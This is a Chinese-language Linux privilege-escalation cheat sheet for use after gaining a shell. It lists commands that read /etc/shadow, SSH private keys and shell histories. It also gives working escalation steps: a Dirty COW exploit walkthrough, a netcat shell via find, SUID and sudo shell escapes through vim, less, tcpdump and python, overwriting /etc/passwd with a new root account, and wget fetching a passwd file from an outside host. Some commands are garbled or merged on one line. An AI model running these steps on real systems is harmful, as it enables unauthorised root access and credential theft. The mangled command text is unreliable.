特权升级所使用的技术
我们假设现在我们在远程系统上有外壳。根据我们渗透进去的方式，我们
可能没有“ root”特权。以下提到的技术可用于获取系统上的“ root”访问权
限。

- 内核漏洞
- 以root身份运行的程序
- 已安装的软件
- 弱密码/重用密码/纯文本密码
- 内部服务
- Suid配置错误
- 滥用sudo权利
- 由root调用的可写脚本
- 路径配置错误
- Cronjobs
- 卸载的文件系统



### 信息收集

（Linux）特权提升的TIps：

- 信息信息，更多的信息收集，信息收集是整个渗透测试过程的
- 整理信息，分析收集的信息和整理信息。
- 搜索漏洞- 知道要搜索什么以及在哪里可以找到漏洞利用代码。
- 修改代码- 修改漏洞利用程序，使其适合目前的渗透。并非每种漏洞都能
- 为“现成”的每个系统工作。漏洞看环境
- 尝试攻击- 为（很多）尝试和错误做好准备。

### 操作系统

什么是发行类型？什么版本的？

```bash
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release # Debian based
cat /etc/redhat-release # Redhat based
```

什么是内核版本？是64位吗？

```bash
cat /proc/version
uname -a uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

环境变量中可能存在密码或API密钥

```bash
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env set

```

### 路径（Path)

如果您对该变量内的任何文件夹都具有写权限，则可以劫持某些库或二进制
文件：PATH

```batch
echo $ PATH
```

### 应用与服务

哪些服务正在运行？哪个服务具有哪个用户特权？

```bash
ps aux
ps -ef top
cat /etc/services
```

### root正在运行哪些服务

```bash
ps aux | grep root ps -ef | grep root
```

### 查看安装的应用程序及版本

```bash
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
```

## 服务设置是否配置错误？是否附有（脆弱的）插件？

```bash
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```

### 计划任务

```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### 是否有纯文本用户名和/或密码

```bash
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
```

### 通讯与网络

系统具有哪些NIC？它是否连接到另一个网络？

```bash
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
```

网络信息

```bash
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
```

其他哪些用户和主机正在与系统通信？

```bash
# Linux
netstat -anlp
netstat -ano

lsof -i
lsof -i :80 grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list chkconfig --list | grep 3:on
last
w

```

IP缓存

```bash
arp -e
route
/sbin/route -nee
```

端口转发

FPipe.exe -l [本地端口] -r [远程端口] -s [本地端口] [本地IP]

FPipe.exe -l 80 -r 80 -s 80 192.168.1.7

注意：ssh-[L / R] [本地端口]：[远程IP]：[远程端口] [本地用户] @ [本地IP]

```bash
ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port
```

### 机密信息和用户

last
cat /etc/passwd | cut -d: -f1 # List of users
grep -v -E "^#" /etc/passwd |
awk -F: '$3 == 0 { print $1}' # List of super users awk -F: '($3 == "0") {pri
cat /etc/sudoers
sudo -l

敏感文件

cat /etc/passwd
cat /etc/group
cat /etc/shadow

用户正在做什么？是否有纯文本密码？他们在编辑什么？

```bash
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

用户信息

```bash
cat ~/.bashrc cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
```

私钥信息

```bash
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

### 文件系统

可以在/ etc /中写入哪些配置文件？能够重新配置服务？

```bash
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null # Other
find /etc/ -readable -type f 2>/dev/null # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone
```

在/ var /中可以找到什么？

```bash
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
```

网站上是否有任何设置/文件（隐藏）？有数据库信息的任何设置文件吗？

```bash
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
```

日志文件中是否有任何内容

```bash
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
```

如果命令受到限制，我们得跳出“受到限制”外壳吗？

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
```

Linux文件权限

```bash
find / -perm -1000 -type d 2>/dev/null # Sticky bit - Only the owner of the
find / -perm -g=s -type f 2>/dev/null # SGID (chmod 2000) - run as the gro
find / -perm -u=s -type f 2>/dev/null # SUID (chmod 4000) - run as the own

```

可以在哪里写入和执行？一些“常见”位置：/ tmp，/ var / tmp，/ dev /
shm

```bash
find / -writable -type d 2>/dev/null # world-writeable folders
find / -perm -222 -type d 2>/dev/null # world-writeable folders
find / -perm -o w -type d 2>/dev/null # world-writeable folders
find / -perm -o x -type d 2>/dev/null # world-executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null # world-writeable
```

### 准备和查找漏洞利用代码

```bash
find / -name perl*
find / -name python*
find / -name gcc* find / -name cc
```

### 上传文件

```bash
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
```

### 内核信息收集

![image-20211004141057683](C:\Users\DISPLAY\AppData\Roaming\Typora\typora-user-images\image-20211004141057683.png)

通过脏牛（CVE-2016-5195）利用易受攻击的机器

```bash
$ whoami 命令–告诉我们当前用户是john（非root用户）
$ uname -a –给我们我们知道容易受到dirtycow攻击的内核版本>从此处下载dirtycow漏洞
– https：//www.exploit-db .com / exploits / 40839 />编译并执行。通过编辑/ etc / passwd
文件，它将“ root”用户替换为新用户“ rash”。
$ su rash –将当前登录用户更改为root用户的“ rash”。
```



### find

nc 反弹 shell

```bash
find test -exec netcat -lvp 5555 -e /bin/sh \;
```

### vi/vim

Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权
限，因此可以读取系统上的所有文件。
打开vim,按下ESC

```bash
:set shell=/bin/sh
:shell

或

sudo vim -c '!sh'
```

### bash

以下命令将以root身份打开一个bash shell。

```bash
bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
```

### less

程序Less也可以执行提权后的shell。同样的方法也适用于其他许多命令。

```bash
less /etc/passwd
!/bin/sh

```

### cp

覆盖 /etc/shadow 或 /etc/passwd

```bash
[root@localhost ~]$ cat /etc/passwd >passwd
[root@localhost ~]$ openssl passwd -1 -salt hack hack123
$1$hack$WTn0dk2QjNeKfl.DHOUue0
[root@localhost ~]$ echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/
[root@localhost ~]$ cp passwd /etc/passwd
[root@localhost ~]$ su - hack
Password:
[root@123 ~]# id
uid=0(hack) gid=0(root) groups=0(root)
[root@123 ~]# cat /etc/passwd|tail -1
hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash
```

### wget

```bash
wget http://192.168.56.1:8080/passwd -O /etc/passwd
```

### tcpdump

```bash
echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

### python

```bash
python -c "import os;os.system('/bin/bash')"
```

